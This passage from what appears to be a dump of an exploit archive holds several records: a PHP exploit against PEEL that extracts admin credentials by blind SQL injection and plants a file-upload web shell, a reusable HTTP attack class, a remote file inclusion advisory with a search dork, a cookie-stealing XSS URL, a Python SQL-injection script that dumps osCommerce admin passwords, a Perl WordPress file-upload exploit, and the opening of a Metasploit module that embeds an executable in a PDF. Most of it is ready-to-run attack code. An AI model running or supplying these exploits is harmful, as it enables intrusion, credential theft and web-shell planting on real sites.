	preg_match(""#(\w{32})</td>#i"",$c,$passwd);  		if(count($login)<1) 		{ 			if($i==0) print ""[*] Attack failed.\n\n""; 			else      print ""[*] Attack failed (if you crack a hash, use -admin param).\n\n""; 			break; 		} 		 		$login	= $login[1]; 		$passwd	= $passwd[1]; 		 		print ""[*] Login:\t$login\n""; 		print ""[*] Hash:\t$passwd\n"";  		$md5 = strtolower($passwd); 		for($a=0;$a<sizeof($md5loc);$a++) 		{ 			$r = crack($md5loc[$a][0],$md5loc[$a][1],$md5loc[$a][2]); 			if($r) { print ""[*] Password:\t$r\n"";break; } 		} 		if(!$r) print ""[*] Can't find the hash on the net, sorry.\n""; 		else 		{  			attack($login,$r); 			die(); 		} 	} 	 	/* --- ATTACK #4: BLIND SQL INJECTION --- */ 	 	print ""[*] Attack #4\n""; 	for($i=0;;$i++) 	{ 		$sql = ""%2527%20OR%20MID((SELECT%20email%20FROM%20peel_utilisateurs%20WHERE%20priv=%2527admin%2527%20LIMIT%200,1),$i,1)=123%20/*""; 		$xpl->get($url.""factures/facture_html.php?mode=facture&id=1&timestamp=$sql/*""); 		if(!preg_match(""#NO HACK#i"",$xpl->getcontent())) 		{ 			print ""[*] Attack failed.\n\n""; 			break; 		} 		 		print ""[*] Login:\t""; 		$login	= blind(""email"",$i); 		if($login=="""") 		{ 			if($i==0) print ""\r[*] Attack failed.\n\n""; 			else      print ""\r[*] Attack failed (if you crack a hash, use -admin param).\n\n""; 			break; 		} 		print ""\n[*] Hash:\t""; 		$passwd	= blind(""mot_passe"",$i); 		print ""\n""; 		$md5 = strtolower($passwd); 		for($a=0;$a<sizeof($md5loc);$a++) 		{ 			$r = crack($md5loc[$a][0],$md5loc[$a][1],$md5loc[$a][2]); 			if($r) { print ""[*] Password:\t$r\n"";break; } 		} 		if(!$r) print ""[*] Can't find the hash on the net, sorry.\n""; 		else 		{  			attack($login,$r); 			die(); 		} 	} }  function blind($field,$i=0) { 	global $xpl,$url; 	$d=0; $v=''; 	 	$charset = ""etaonisrhldcumfpwgbyvkxjqz0123456789_-\$.^()[]{}Å *\""'@=/\|#?+&!`<>:;,\\""; 	if(eregi('p',$field)) $charset = ""0123456789abcdef"";  	while(TRUE) 	{ 		$d++; 		for($e=0;$e<strlen($charset);$e++) 		{ 			$f=ord(substr($charset,$e,1)); 			$sql = ""%2527%20OR%20MID((SELECT%20$field%20FROM%20peel_utilisateurs%20WHERE%20priv=%2527admin%2527%20LIMIT%20$i,1),$d,1)=CHAR($f)%20/*""; 			$xpl->get($url.""factures/facture_html.php?mode=facture&id=1&timestamp=$sql/*""); 			if(!preg_match(""#NO HACK#"",$xpl->getcontent(),$matches)) 			{ 				print strtolower(chr($f)); 				$v .= chr($f); 				break; 			} 			elseif($e==strlen($charset)-1) return $v; 		} 	} }  function attack($login,$r) { 	global $xpl,$url; 	print ""\n[*] Login in ... ""; 	$xpl->reset(""cookies""); 	$c=$xpl->post($url.""/membre.php"",""email=$login&mot_passe=$r""); 	if(!preg_match(""#Location:.*"".$url.""index.php#i"",$c) || !preg_match(""#PHPSESSID=(\w{32})#i"",$c,$sid)) 	{ print ""failed.\n"";return 0; } 	$sid = $sid[1]; 	print ""done.\n""; 	print ""[*] SID:\t$sid\n""; 	$xpl->addcookie(""PHPSESSID"",$sid);  	print ""\n[*] Adding a fake product ... "";  	$uploadc0de='<?php if(isset($_POST[\'upload\'])) { if( !move_uploaded_file($_FILES[\'file\'][\'tmp_name\'], ""./"".$_FILES[\'file\'][\'name\'])) echo(""<center>Error "".$_FILES[\'file\'][\'error\'].""</center>"");else echo ""<center>File uploaded</center>""; } ?><?php if(isset($_GET[\'del\'])) unlink(""up.php""); ?><form method=""post"" enctype=""multipart/form-data""><center><input type=""file"" name=""file""><input type=""submit"" name=""upload"" value=""Upload""></center></form>'; 	$frmdt	=	array(frmdt_url	  => $url.""administrer/produits.php?mode=ajout"", 					""mode""		  => ""insere"", 					""id""		  => """", 					""categories[]""=> ""-1"", 					""reference""	  => """", 					""nom""		  => ""hell0"", 					""nom_fr""	  => ""hell0"", 					""nom_en""	  => ""hell0"", 					""prix""		  => """", 					""tva""		  => ""19.60"", 					""promotion""   => """", 					""references[]""=> """", 					""descriptif""  => """", 					""pformat""	  => ""html"", 					""description"" => """", 					""mp3""		  => """", 					""extrait""	  => """", 					""image1""	  => array(frmdt_filename	=> """", 								     frmdt_type		=> ""application/octet-stream"", 								     frmdt_content	=> """"), 					""image2""	  => array(frmdt_filename	=> """", 										   frmdt_type		=> ""application/octet-stream"", 										   frmdt_content	=> """"), 					""image3""	  => array(frmdt_filename	=> ""file.php"", 										   frmdt_type		=> ""image/gif"", 										   frmdt_content	=> ""$uploadc0de""), 					""image4""	  => array(frmdt_filename	=> """", 										   frmdt_type		=> ""application/octet-stream"", 										   frmdt_content	=> """"), 					""pdf""		  => array(frmdt_filename	=> ""file.php"", 										   frmdt_type		=> ""application/pdf"", 										   frmdt_content	=> ""$uploadc0de""), 					);  	$c = $xpl->formdata($frmdt);  	if(!preg_match(""#([0-9]+)(&page=[0-9]+)?\""[^<]*>(<[^<]+>)?hell0(<[^<]+>)?</a>#i"",$c,$id)) 	{ print ""failed.\n"";return 0; }  	$id = $id[1]; 	print ""done.\n""; 	print ""[*] Article ID:\t$id\n""; 	 	print ""[*] Uploading uploader ... ""; 	$c = $xpl->get($url.""administrer/produits.php?mode=modif&id=$id""); 	if(!preg_match(""#((administrer/)?upload/)([a-z._-]+_[0-9]{6}_[0-9]{6}|[0-9]{6}_[0-9]{6}_PEEL_\w{6})\.php#i"",$c,$file)) print ""failed (can't find file).\n""; 	else 	{ 		$frmdt =  array(frmdt_url=>$url.$file[0],""upload""=>1,""file""=> array(frmdt_filename=>""up.php"",frmdt_type=>""text/plain"",frmdt_content=>""$uploadc0de"")); 		if(preg_match(""#Uploaded#i"",$xpl->formdata($frmdt))) print ""done.\n""; 		else print ""failed (can't upload file).\n""; 	} 	 	print ""[*] Deleting the fake product ... ""; 	$xpl->get($url.""administrer/produits.php?mode=suppr&id=$id""); 	print ""done.\n""; 	 	if(sizeof($file)>0) 	{ 		$path = $file[1]; 		print ""\n[*] Uploader: "".$url.$path.""up.php\n""; 	} 	 	return 1; }  function crack($url,$post,$gex) { 	global $xpl,$md5; 	if($post!=''&&preg_match(""#$gex#"",$xpl->post(""$url"",""$post$md5""),$res)) return $res[1]; 	elseif(preg_match(""#$gex#"",$xpl->get(""$url$md5""),$res)) return $res[1]; 	return 0; }  function getparam($param,$opt='') { 	global $argv; 	foreach($argv as $value => $key) 	{ 		if($key == '-'.$param) return $argv[$value+1]; 	} 	if($opt) exit(""\n-$param parameter required""); 	else return; }  /*  *   * Copyright (C) darkfig  *   * This program is free software; you can redistribute it and/or   * modify it under the terms of the GNU General Public License   * as published by the Free Software Foundation; either version 2   * of the License, or (at your option) any later version.   *   * This program is distributed in the hope that it will be useful,   * but WITHOUT ANY WARRANTY; without even the implied warranty of   * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the   * GNU General Public License for more details.   *   * You should have received a copy of the GNU General Public License   * along with this program; if not, write to the Free Software   * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.  *   * TITLE:          PhpSploit Class  * REQUIREMENTS:   PHP 4 / PHP 5  * VERSION:        2.0  * LICENSE:        GNU General Public License  * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt  * FILENAME:       phpsploitclass.php  *  * CONTACT:        gmdarkfig@gmail.com (french / english)  * GREETZ:         Sparah, Ddx39  *  * DESCRIPTION:  * The phpsploit is a class implementing a web user agent.  * You can add cookies, headers, use a proxy server with (or without) a  * basic authentification. It supports the GET and the POST method. It can  * also be used like a browser with the cookiejar() function (which allow  * a server to add several cookies for the next requests) and the  * allowredirection() function (which allow the script to follow all  * redirections sent by the server). It can return the content (or the  * headers) of the request. Others useful functions can be used for debugging.  * A manual is actually in development but to know how to use it, you can  * read the comments.  *  * CHANGELOG:  *  * [2007-06-10] (2.0)  *  * Code: Code optimization  *  * New: Compatible with PHP 4 by default  *  * [2007-01-24] (1.2)  *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))  *  * New: multipart/form-data enctype is now supported   *  * [2006-12-31] (1.1)  *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)  *  * New: You can now call the getheader() / getcontent() function without parameters  *  * [2006-12-30] (1.0)  *  * First version  *   */  class phpsploit { 	var $proxyhost; 	var $proxyport; 	var $host; 	var $path; 	var $port; 	var $method; 	var $url; 	var $packet; 	var $proxyuser; 	var $proxypass; 	var $header; 	var $cookie; 	var $data; 	var $boundary; 	var $allowredirection; 	var $last_redirection; 	var $cookiejar; 	var $recv; 	var $cookie_str; 	var $header_str; 	var $server_content; 	var $server_header; 	  	/** 	 * This function is called by the 	 * get()/post()/formdata() functions. 	 * You don't have to call it, this is 	 * the main function. 	 * 	 * @access private 	 * @return string $this->recv ServerResponse 	 *  	 */ 	function sock() 	{ 		if(!empty($this->proxyhost) && !empty($this->proxyport)) 		   $socket = @fsockopen($this->proxyhost,$this->proxyport); 		else 		   $socket = @fsockopen($this->host,$this->port); 		 		if(!$socket) 		   die(""Error: Host seems down""); 		 		if($this->method=='get') 		   $this->packet = 'GET '.$this->url."" HTTP/1.1\r\n""; 		    		elseif($this->method=='post' or $this->method=='formdata') 		   $this->packet = 'POST '.$this->url."" HTTP/1.1\r\n""; 		    		else 		   die(""Error: Invalid method""); 		 		if(!empty($this->proxyuser)) 		   $this->packet .= 'Proxy-Authorization: Basic '.base64_encode($this->proxyuser.':'.$this->proxypass).""\r\n""; 		 		if(!empty($this->header)) 		   $this->packet .= $this->showheader(); 		    		if(!empty($this->cookie)) 		   $this->packet .= 'Cookie: '.$this->showcookie().""\r\n""; 	 		$this->packet .= 'Host: '.$this->host.""\r\n""; 		$this->packet .= ""Connection: Close\r\n""; 		 		if($this->method=='post') 		{ 			$this->packet .= ""Content-Type: application/x-www-form-urlencoded\r\n""; 			$this->packet .= 'Content-Length: '.strlen($this->data).""\r\n\r\n""; 			$this->packet .= $this->data.""\r\n""; 		} 		elseif($this->method=='formdata') 		{ 			$this->packet .= 'Content-Type: multipart/form-data; boundary='.str_repeat('-',27).$this->boundary.""\r\n""; 			$this->packet .= 'Content-Length: '.strlen($this->data).""\r\n\r\n""; 			$this->packet .= $this->data; 		}  		$this->packet .= ""\r\n""; 		$this->recv = '';  		fputs($socket,$this->packet);  		while(!feof($socket)) 		   $this->recv .= fgets($socket);  		fclose($socket);  		if($this->cookiejar) 		   $this->getcookie();  		if($this->allowredirection) 		   return $this->getredirection(); 		else 		   return $this->recv; 	} 	  	/** 	 * This function allows you to add several 	 * cookies in the request. 	 *  	 * @access  public 	 * @param   string cookn CookieName 	 * @param   string cookv CookieValue 	 * @example $this->addcookie('name','value') 	 *  	 */ 	function addcookie($cookn,$cookv) 	{ 		if(!isset($this->cookie)) 		   $this->cookie = array();  		$this->cookie[$cookn] = $cookv; 	}   	/** 	 * This function allows you to add several 	 * headers in the request. 	 * 	 * @access  public 	 * @param   string headern HeaderName 	 * @param   string headervalue Headervalue 	 * @example $this->addheader('Client-IP', '128.5.2.3') 	 *  	 */ 	function addheader($headern,$headervalue) 	{ 		if(!isset($this->header)) 		   $this->header = array(); 		    		$this->header[$headern] = $headervalue; 	}   	/** 	 * This function allows you to use an 	 * http proxy server. Several methods 	 * are supported. 	 *  	 * @access  public 	 * @param   string proxy ProxyHost 	 * @param   integer proxyp ProxyPort 	 * @example $this->proxy('localhost',8118) 	 * @example $this->proxy('localhost:8118') 	 *  	 */ 	function proxy($proxy,$proxyp='') 	{ 		if(empty($proxyp)) 		{ 			$proxarr = explode(':',$proxy); 			$this->proxyhost = $proxarr[0]; 			$this->proxyport = (int)$proxarr[1]; 		} 		else  		{ 			$this->proxyhost = $proxy; 			$this->proxyport = (int)$proxyp; 		}  		if($this->proxyport > 65535) 		   die(""Error: Invalid port number""); 	} 	  	/** 	 * This function allows you to use an 	 * http proxy server which requires a 	 * basic authentification. Several 	 * methods are supported: 	 * 	 * @access  public 	 * @param   string proxyauth ProxyUser 	 * @param   string proxypass ProxyPass 	 * @example $this->proxyauth('user','pwd') 	 * @example $this->proxyauth('user:pwd'); 	 *  	 */ 	function proxyauth($proxyauth,$proxypass='') 	{ 		if(empty($proxypass)) 		{ 			$posvirg = strpos($proxyauth,':'); 			$this->proxyuser = substr($proxyauth,0,$posvirg); 			$this->proxypass = substr($proxyauth,$posvirg+1); 		} 		else 		{ 			$this->proxyuser = $proxyauth; 			$this->proxypass = $proxypass; 		} 	}   	/** 	 * This function allows you to set 	 * the 'User-Agent' header. 	 *  	 * @access  public 	 * @param   string useragent Agent 	 * @example $this->agent('Firefox') 	 *  	 */ 	function agent($useragent) 	{ 		$this->addheader('User-Agent',$useragent); 	}  	 	/** 	 * This function returns the headers 	 * which will be in the next request. 	 *  	 * @access  public 	 * @return  string $this->header_str Headers 	 * @example $this->showheader() 	 *  	 */ 	function showheader() 	{ 		$this->header_str = ''; 		 		if(!isset($this->header)) 		   return; 		    		foreach($this->header as $name => $value) 		   $this->header_str .= $name.': '.$value.""\r\n""; 		    		return $this->header_str; 	}  	 	/** 	 * This function returns the cookies 	 * which will be in the next request. 	 *  	 * @access  public 	 * @return  string $this->cookie_str Cookies 	 * @example $this->showcookie() 	 *  	 */ 	function showcookie() 	{ 		$this->cookie_str = ''; 		 		if(!isset($this->cookie)) 		   return; 		 		foreach($this->cookie as $name => $value) 		   $this->cookie_str .= $name.'='.$value.'; ';  		return $this->cookie_str; 	}   	/** 	 * This function returns the last 	 * formed http request. 	 *  	 * @access  public 	 * @return  string $this->packet HttpPacket 	 * @example $this->showlastrequest() 	 *  	 */ 	function showlastrequest() 	{ 		if(!isset($this->packet)) 		   return; 		else 		   return $this->packet; 	}   	/** 	 * This function sends the formed 	 * http packet with the GET method. 	 *  	 * @access  public 	 * @param   string url Url 	 * @return  string $this->sock() 	 * @example $this->get('localhost/index.php?var=x') 	 * @example $this->get('http://localhost:88/tst.php') 	 *  	 */ 	function get($url) 	{ 		$this->target($url); 		$this->method = 'get'; 		return $this->sock(); 	}  	 	/** 	 * This function sends the formed 	 * http packet with the POST method. 	 * 	 * @access  public 	 * @param   string url  Url 	 * @param   string data PostData 	 * @return  string $this->sock() 	 * @example $this->post('http://localhost/','helo=x') 	 *  	 */	 	function post($url,$data) 	{ 		$this->target($url); 		$this->method = 'post'; 		$this->data = $data; 		return $this->sock(); 	} 	  	/** 	 * This function sends the formed http 	 * packet with the POST method using 	 * the multipart/form-data enctype. 	 *  	 * @access  public 	 * @param   array array FormDataArray 	 * @return  string $this->sock() 	 * @example $formdata = array( 	 *                      frmdt_url => 'http://localhost/upload.php', 	 *                      frmdt_boundary => '123456', # Optional 	 *                      'var' => 'example', 	 *                      'file' => array( 	 *                                frmdt_type => 'image/gif',  # Optional 	 *                                frmdt_transfert => 'binary' # Optional 	 *                                frmdt_filename => 'hello.php, 	 *                                frmdt_content => '<?php echo 1; ?>')); 	 *          $this->formdata($formdata); 	 *  	 */ 	function formdata($array) 	{ 		$this->target($array[frmdt_url]); 		$this->method = 'formdata'; 		$this->data = ''; 		 		if(!isset($array[frmdt_boundary])) 		   $this->boundary = 'phpsploit'; 		else 		   $this->boundary = $array[frmdt_boundary];  		foreach($array as $key => $value) 		{ 			if(!preg_match('#^frmdt_(boundary|url)#',$key)) 			{ 				$this->data .= str_repeat('-',29).$this->boundary.""\r\n""; 				$this->data .= 'Content-Disposition: form-data; name=""'.$key.'"";'; 				 				if(!is_array($value)) 				{ 					$this->data .= ""\r\n\r\n"".$value.""\r\n""; 				} 				else 				{ 					$this->data .= ' filename=""'.$array[$key][frmdt_filename].""\"";\r\n"";  					if(isset($array[$key][frmdt_type])) 					   $this->data .= 'Content-Type: '.$array[$key][frmdt_type].""\r\n"";  					if(isset($array[$key][frmdt_transfert])) 					   $this->data .= 'Content-Transfer-Encoding: '.$array[$key][frmdt_transfert].""\r\n"";  					$this->data .= ""\r\n"".$array[$key][frmdt_content].""\r\n""; 				} 			} 		}  		$this->data .= str_repeat('-',29).$this->boundary.""--\r\n""; 		return $this->sock(); 	}  	 	/** 	 * This function returns the content 	 * of the server response, without 	 * the headers. 	 *  	 * @access  public 	 * @param   string code ServerResponse 	 * @return  string $this->server_content 	 * @example $this->getcontent() 	 * @example $this->getcontent($this->get('http://localhost/')) 	 *  	 */ 	function getcontent($code='') 	{ 		if(empty($code)) 		   $code = $this->recv;  		$code = explode(""\r\n\r\n"",$code); 		$this->server_content = ''; 		 		for($i=1;$i<count($code);$i++) 		   $this->server_content .= $code[$i];  		return $this->server_content; 	}  	 	/** 	 * This function returns the headers 	 * of the server response, without 	 * the content. 	 *  	 * @access  public 	 * @param   string code ServerResponse 	 * @return  string $this->server_header 	 * @example $this->getcontent() 	 * @example $this->getcontent($this->post('http://localhost/','1=2')) 	 *  	 */ 	function getheader($code='') 	{ 		if(empty($code)) 		   $code = $this->recv;  		$code = explode(""\r\n\r\n"",$code); 		$this->server_header = $code[0]; 		 		return $this->server_header; 	}  	 	/** 	 * This function is called by the 	 * cookiejar() function. It adds the 	 * value of the ""Set-Cookie"" header 	 * in the ""Cookie"" header for the 	 * next request. You don't have to 	 * call it. 	 *  	 * @access private 	 * @param  string code ServerResponse 	 *  	 */ 	function getcookie() 	{ 		foreach(explode(""\r\n"",$this->getheader()) as $header) 		{ 			if(preg_match('/set-cookie/i',$header)) 			{ 				$fequal = strpos($header,'='); 				$fvirgu = strpos($header,';'); 				 				// 12=strlen('set-cookie: ') 				$cname  = substr($header,12,$fequal-12); 				$cvalu  = substr($header,$fequal+1,$fvirgu-(strlen($cname)+12+1)); 				 				$this->cookie[trim($cname)] = trim($cvalu); 			} 		} 	}   	/** 	 * This function is called by the 	 * get()/post() functions. You 	 * don't have to call it. 	 * 	 * @access  private 	 * @param   string urltarg Url 	 * @example $this->target('http://localhost/') 	 *  	 */ 	function target($urltarg) 	{ 		if(!ereg('^http://',$urltarg)) 		   $urltarg = 'http://'.$urltarg; 		    		$urlarr     = parse_url($urltarg); 		$this->url  = 'http://'.$urlarr['host'].$urlarr['path']; 		 		if(isset($urlarr['query'])) 		   $this->url .= '?'.$urlarr['query']; 		 		$this->port = !empty($urlarr['port']) ? $urlarr['port'] : 80; 		$this->host = $urlarr['host']; 		 		if($this->port != '80') 		   $this->host .= ':'.$this->port;  		if(!isset($urlarr['path']) or empty($urlarr['path'])) 		   die(""Error: No path precised"");  		$this->path = substr($urlarr['path'],0,strrpos($urlarr['path'],'/')+1);  		if($this->port > 65535) 		   die(""Error: Invalid port number""); 	} 	 	 	/** 	 * If you call this function, 	 * the script will extract all 	 * 'Set-Cookie' headers values 	 * and it will automatically add 	 * them into the 'Cookie' header 	 * for all next requests. 	 * 	 * @access  public 	 * @param   integer code 1(enabled) 0(disabled) 	 * @example $this->cookiejar(0) 	 * @example $this->cookiejar(1) 	 *  	 */ 	function cookiejar($code) 	{ 		if($code=='0') 		   $this->cookiejar=FALSE;  		elseif($code=='1') 		   $this->cookiejar=TRUE; 	}   	/** 	 * If you call this function, 	 * the script will follow all 	 * redirections sent by the server. 	 *  	 * @access  public 	 * @param   integer code 1(enabled) 0(disabled) 	 * @example $this->allowredirection(0) 	 * @example $this->allowredirection(1) 	 *  	 */ 	function allowredirection($code) 	{ 		if($code=='0') 		   $this->allowredirection=FALSE; 		    		elseif($code=='1') 		   $this->allowredirection=TRUE; 	}  	 	/** 	 * This function is called if 	 * allowredirection() is enabled. 	 * You don't have to call it. 	 * 	 * @access private 	 * @return string $this->get('http://'.$this->host.$this->path.$this->last_redirection) 	 * @return string $this->get($this->last_redirection) 	 * @return string $this->recv; 	 *  	 */ 	function getredirection() 	{ 		if(preg_match('/(location|content-location|uri): (.*)/i',$this->getheader(),$codearr)) 		{ 			$this->last_redirection = trim($codearr[2]); 			 			if(!ereg('://',$this->last_redirection)) 			   return $this->get('http://'.$this->host.$this->path.$this->last_redirection);  			else 			   return $this->get($this->last_redirection); 		} 		else 		   return $this->recv; 	}   	/** 	 * This function allows you 	 * to reset some parameters. 	 *  	 * @access  public 	 * @param   string func Param 	 * @example $this->reset('header') 	 * @example $this->reset('cookie') 	 * @example $this->reset() 	 *  	 */ 	function reset($func='') 	{ 		switch($func) 		{ 			case 'header': 			$this->header = array(''); 			break; 				 			case 'cookie': 			$this->cookie = array(''); 			break; 				 			default: 			$this->cookiejar = ''; 			$this->header = array(''); 			$this->cookie = array(''); 			$this->allowredirection = ''; 			break; 		} 	} }  ?>  # milw0rm.com [2008-03-19]",remote,webapps,1
2063,"ArticlesOne 07232006 - 'page' Remote File Inclusion                    X                                                                                   X                 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX                            X                                                                                        X                 X                                                                                        X    		X  MMMMMMMMM M     M MMMMMMMM  MMMMMMMM MMMMMMMM M        MMMMMMMMM MMMMMMMMM MMMMMMMMM  X                 X  M          M   M  M      M  M        M      M M        M       M M       M M       M  X 	        X  M           M M   M      M  M        M      M M        M       M M       M M       M  X 		X  M            M    M      M  M        M      M M        M       M M       M M       M  X 		X  M            M    MMMMMMMM  MMMMMMMM MMMMMMMM M        M       M MMMMMMMMM M       M  X 	 	X  M            M    M      M  M        M      M M        M       M M       M M       M  X 		X  M            M    M      M  M        M      M M        M       M M       M M       M  X 		X  M            M    M      M  M        M      M M        M       M M       M M       M  X 		X  MMMMMMMMM    M    MMMMMMMM  MMMMMMMM M      M MMMMMMMM MMMMMMMMM M       M MMMMMMMMM  X                 X                                                                                        X                 X                                                                                        X                 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX                       x                                                                                   x    ################################################################################# #                                                                               # # TitLe   : ArticLeS One Remote File Inclusion Vulnerability                    # #                                                                               # ################################################################################# #                                                                               # # Site    : www.articlesone.com                                                 # #                                                                               # ################################################################################# #                                                                               # # Author  : CyberLord                                                           # #                                                                               # ################################################################################# #                                                                               # # DoRk    : Powered by ArticlesOne.com oR Website Powered by ArticlesOne.com    # #                                                                               # ################################################################################# #                                                                               # # ExpLoit : http://[site]/[path]/index.php?page=[attackeR Code]                 # #                                                                               # ################################################################################# #                                                                               # # gReatZ  : Sao  ,  Liz0zim  And ALL Cyber-Soldiers.Org Users              	# #                                                                               # ################################################################################# #                  								# # contact : support@cyber-soldiers.org, WwW.Cyber-Soldiers.org                  # #										# #################################################################################  # milw0rm.com [2006-07-23]",remote,webapps,1
32220,"Kayako SupportSuite 3.x - 'index.php?filter' Cross-Site Scripting source: https://www.securityfocus.com/bid/30642/info   Kayako SupportSuite is prone to multiple input-validation vulnerabilities, including an SQL-injection issue, multiple cross-site scripting issues, and an HTML-injection issue. The vulnerabilities occur because the application fails to sufficiently sanitize user-supplied data.   Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, control how the site is rendered to the user, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   Versions prior to Kayako SupportSuite 3.30 are vulnerable.   http://www.example.com/index.php?_m=news&_a=view&filter=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Ca%20href=%22",remote,webapps,1
34052,"osCommerce Visitor Web Stats AddOn - 'Accept-Language' Header SQL Injection source: https://www.securityfocus.com/bid/40425/info  osCommerce Visitor Web Stats is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  import sys import http.client  if len(sys.argv) < 2:         print(""usage: "" + sys.argv[0] + "" <host> [<path>]"")         sys.exit();  host = sys.argv[1] if len(sys.argv) > 2:         path = sys.argv[2] else:         path = ""/""  def req(lang):         c = http.client.HTTPConnection(host)         c.request('GET', path, '', {'Accept-Language': lang})         return c.getresponse().read();  def check(condition):         r = req(""' AND 1=0 UNION SELECT id FROM administrators "" + condition         + "" -- '"")         if r.find(b'update') != -1:                 return 1;         elif r.find(b'Unknown column') != -1:                 print('Unknown database structure (no rc version?)')                 sys.exit();         return 0;  if req(""'"").find(b'select counter FROM visitors where browser_ip') == -1:         print('Target does not seem to have (a vulnarable version of)         Visitor Web Stats or doesn\'t output any error messages')         sys.exit();  admin_count = 1 while not check(""HAVING COUNT(*) = "" + str(admin_count)):         admin_count += 1; print(""Number of admins: "" + str(admin_count))  pw_chars = [x for x in range(48, 58)] pw_chars.extend([x for x in range(97, 103)]) pw_chars.sort()  todo = [('', 0, 255)] while len(todo):         (found, start, end) = todo.pop()         if start == 0 and end == 255 and check(""WHERE user_name = '"" + found         + ""'""):                 sys.stdout.write(found + "" "")                 sys.stdout.flush()                 for i in range(35):                         if i == 32:                                 sys.stdout.write("":"")                                 sys.stdout.flush()                                 continue                         pw_start, pw_end = 0, len(pw_chars) - 1                         while pw_start != pw_end:                                 pw_mid = int((pw_start + pw_end) / 2)                                 if check(""WHERE user_name = '"" + found + ""'                                 AND ORD(SUBSTRING(user_password, "" + str(i + 1) + "", 1)) <= "" + str(pw_chars[pw_mid])):                                         pw_end = pw_mid                                 else:                                         if pw_mid == pw_end - 1:                                                 pw_start = pw_end                                         else:                                                 pw_start = pw_mid                         sys.stdout.write(chr(pw_chars[pw_start]))                         sys.stdout.flush()                 print()                 if not check(""WHERE SUBSTRING(user_name, 1, "" +                 str(len(found)) + "") = '"" + found + ""' AND SUBSTRING(user_name, "" + str(len(found) + 1) + "", 1) > 0""):                         continue;         mid = int((start + end) / 2)         if check(""WHERE SUBSTRING(user_name, 1, "" + str(len(found)) + "") =         '"" + found + ""' AND ORD(SUBSTRING(user_name, "" + str(len(found) + 1) + "", 1)) <= "" + str(mid) + "" AND ORD(SUBSTRING(user_name, "" + str(len(found) + 1) + "", 1)) > 0""):                 if mid == start + 1:                         todo.append((found + chr(mid), 0, 255))                 else:                         todo.append((found, start, mid))         if check(""WHERE SUBSTRING(user_name, 1, "" + str(len(found)) + "") =         '"" + found + ""' AND ORD(SUBSTRING(user_name, "" + str(len(found) + 1) + "", 1)) > "" + str(mid)):                 if mid == end - 1:                         todo.append((found + chr(end), 0, 255))                 else:                         todo.append((found, mid, end))",remote,webapps,1
6867,"WordPress Plugin E-Commerce 3.4 - Arbitrary File Upload #!/usr/bin/perl  use warnings; use strict; use LWP::UserAgent; use HTTP::Request::Common;  my $fname = rand(99999) . "".php""; # no int()  print <<INTRO; # messy print i know.. - Wordpress Plugin e-Commerce <= 3.4 Arbitrary File Upload -             Discovered && Coded by: t0pP8uZz             Discovered on: 20 October 2008      Theres no current vulnerabilitys for this plugin, but the   vulnerability explained here no longer exists in the later   versions of the plugin, due to a code rewrite.      In testing this vulnerability, i wrote a scraping content   program, and found ALOT of vulnerable sites.      This exploit will upload a selected file to the...   ... /wp-content/plugins/wp-shopping-cart/ directory.      If the directory is not writable (rare cases) you can   mod this exploit and use the insecure GET variable   ""imagedir"" to directory traversal.. so you can upload   in diffrent directorys.      Contact: irc.rizon.net #sectalk      Dork: inurl:""/wp-content/plugins/wp-shopping-cart/""  INTRO  print ""\nEnter URL(ie: http://site.com/mambo): "";     chomp(my $url=<STDIN>);      print ""\nEnter File Path(path to local file to upload): "";     chomp(my $file=<STDIN>);      my $ua = LWP::UserAgent->new; my $re = $ua->request(POST $url . '/wp-content/plugins/wp-shopping-cart/image_processing.php',                       Content_Type => 'form-data',                       Content      => [ Submit => ""Add"", image => [ $file, $fname, Content_Type => 'plain/text' ], ] );  die ""Exploit Failed: HTTP POST Failed!"" unless $re->is_success;  if($re->content =~ /Fatal error/i) {      print ""Complete! To see if exploit was successfull visit the following URL for your uploaded file.\n"";     print ""Uploaded File: "" . $url . ""/wp-content/plugins/wp-shopping-cart/"" . $fname . ""\n""; } else {     print ""Exploit Failed! Target host not vulnerable!\n""; } exit;  # milw0rm.com [2008-10-29]",local,webapps,1
16682,"Adobe PDF - Escape EXE Social Engineering (No JavaScript) (Metasploit) ## # $Id: adobe_pdf_embedded_exe_nojs.rb 11353 2010-12-16 20:11:01Z egypt $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  # # Modified version of the Adobe PDF Embedded EXE Social Engineering ""adobe_pdf_embedded_exe.rb"". # This version does not require JavaScript to be enabled and does not required the EXE to be # attached to the PDF.  The EXE is embedded in the PDF in a non-standard method using HEX # encoding. # # Lots of reused code from adobe_pdf_embedded_exe.rb and the other PDF modules to make the PDF. # Thanks to all those that wrote the code for those modules, as I probably could not have # wrote this module without borrowing code from them. #   require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::FILEFORMAT 	include Msf::Exploit::EXE  	def initialize(info = {}) 		super(update_info(info, 			'Name'		=> 'Adobe PDF Escape EXE Social Engineering (No JavaScript)', 			'Description' 	=> %q{ 					This module embeds a Metasploit payload into an existing PDF file in 				a non-standard method. The resulting PDF can be sent to a target as 				part of a social engineering attack. 			}, 			'License'	=> MSF_LICENSE, 			'Author'	   => 				[ 					'Jeremy Conway <jeremy[at]sudosecure.net>', 				], 			'Version'        => '$Revision: 11353 $', 			'References'     => 				[ 					[ 'CVE', '2010-1240' ], 					[ 'OSVDB', '63667' ], 					[ 'URL', 'http://blog.didierstevens.com/2010/04/06/update-escape-from-pdf/' ], 					[ 'URL', 'http://blog.didierstevens.com/2010/03/31/escape-from-foxit-reader/' ], 					[ 'URL', 